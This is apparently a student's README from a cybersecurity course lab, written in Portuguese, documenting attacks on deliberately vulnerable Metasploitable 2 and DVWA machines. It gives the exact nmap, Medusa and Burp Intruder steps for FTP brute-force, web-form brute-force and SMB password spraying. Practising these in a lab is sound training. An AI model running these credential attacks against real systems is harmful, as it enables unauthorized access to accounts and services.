# santander-cybersecurity
Repositório destinado ao desafio do curso Santander - Cibersegurança 2025

Este repositório contém a documentação completa do desafio solicitado no curso Santander - Cibersegurança 2025, utilizando o Kali Linux, Metasploitable 2, DVWA, Medusa e outras ferramentas para simular ataques de força bruta e estudar ataque comuns em ambientes vulneráveis.

🎯 **Objetivo do Desafio**

O objetivo foi simular ataques reais para fins educativos, entre eles:
● Brute-force em FTP
● Brute-force em formulário web (DVWA)
● Password spraying em SMB

🧩 **Cenário do Laboratório**

● VM 1 (Atacante): Kali Linux
● VM 2 (Alvo): Metasploitable 2
Rede: Host-only Network

📌 **Download do Metasploitable 2**

Baixado via SourceForge.

📸 Screenshot da página de download:
<img src="images/download_metasploitable.png" width="500">

📌 Criação da VM no VirtualBox

Importação da ISO/VDI do Metasploitable

Configuração da rede como Host-only Adapter

Inicialização da máquina e aguardo das configurações iniciais

📸 Screenshot da inicialização da VM:
<img src="images/startup_cli.png" width="500">

📌 Login padrão

Credenciais usadas:

msfadmin / msfadmin


📸 Screenshot do login realizado:
<img src="images/login_msfadmin.png" width="500">

🌐 Verificação de Comunicação

No Kali, verifiquei IP com:

ifconfig


E testei comunicação com:

ping 192.168.1.7


📸 Screenshot do ping:
<img src="images/ping_test.png" width="450">

🛰️ Enumeração com Nmap

Comando utilizado:

nmap -sV -v -p- 192.168.1.7


Flags:

-sV → descobre serviços e versões

-v → modo verboso

-p- → escaneia todas as portas

📸 Screenshot do scan:
<img src="images/nmap_scan.png" width="500">

Resultado: porta 21 (FTP) aberta e vulnerável, além de smb, http e outros serviços inseguros.

🔐 Ataque 1 — Força Bruta em FTP com Medusa

Criação manual de wordlists:

echo "admin\nmsfadmin\nroot\nteste\nftp" > usuarios_comuns.txt
echo "12345\nmsfadmin\nteste\n123456789\nroot\nadmin\nftp" > senhas_comuns.txt


Ataque com Medusa:

medusa -h 192.168.1.7 -U usuarios_comuns.txt -P senhas_comuns.txt -M ftp -t 5

🔍 Flags explicadas:

-h → host alvo

-U → arquivo contendo lista de usuários

-P → arquivo contendo lista de senhas

-M ftp → módulo do protocolo (FTP nesse caso)

-t 5 → cinco threads simultâneas

📸 Screenshot do brute-force:
<img src="images/medusa_ftp.png" width="550">

Credencial encontrada:

msfadmin : msfadmin

🕸️ Ataque 2 — Brute-force em Formulário Web DVWA com Burp Suite
1. Abrir login do DVWA e interceptar a requisição

Configuração do proxy e captura do login.

📸 Screenshot da página DVWA:
<img src="images/dvwa_login.png" width="500">

📸 Requisição capturada:
<img src="images/burp_request.png" width="500">

2. Enviar a requisição ao Intruder

→ Botão direito → Send to Intruder

📸
<img src="images/send_to_intruder.png" width="450">

3. Configurar modo Cluster Bomb

posição 1 → username

posição 2 → password

payloads → wordlists do SecLists

📸
<img src="images/intruder_positions.png" width="500">

4. Execução do ataque

Todas as respostas retornam 200, mas uma tem tamanho diferente → credencial válida.

📸
<img src="images/intruder_results.png" width="550">

Credencial descoberta:

admin : password

📁 Ataque 3 — Password Spraying em SMB

Comando utilizado:

medusa -h 192.168.1.7 -U /home/kali/Wordlists/Sec-Lists-master/Usernames/top-usernames-shortlist.txt -p "user" -M smbnt -f


Flags importantes:

-U → lista de usuários

-p → senha única (password spraying)

-M smbnt → módulo para SMB

-f → encerra ao encontrar credencial válida

📸
<img src="images/medusa_smb.png" width="550">

Credencial identificada:

user : user
